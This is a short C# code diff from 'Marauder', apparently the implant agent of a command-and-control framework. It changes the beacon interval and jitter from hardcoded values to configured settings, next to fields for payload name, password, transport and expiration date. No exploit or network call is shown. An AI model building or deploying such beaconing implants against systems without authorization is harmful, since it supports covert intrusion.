@@ -23,6 +23,9 @@ namespace Marauder
       State.PayloadName = settings["PayloadName"];
       State.Password = settings["Password"];
       State.InitialTransport = settings["Transport"];
+      State.Sleep = Int32.Parse(settings["BeaconInterval"]);
+      State.Jitter = Double.Parse(settings["Jitter"]);
+
       if (!String.IsNullOrEmpty(settings["ExpirationDate"]))
       {
         State.ExpirationDate = DateTime.Parse(settings["ExpirationDate"]);
@@ -33,8 +36,6 @@ namespace Marauder
         State.Debug = Boolean.Parse(settings["Debug"]);
       }
 
-      State.Sleep = 5;
-      State.Jitter = 1.5;
       State.MaxAttempts = 20;
       State.LastTaskName = null;
 #if DEBUG
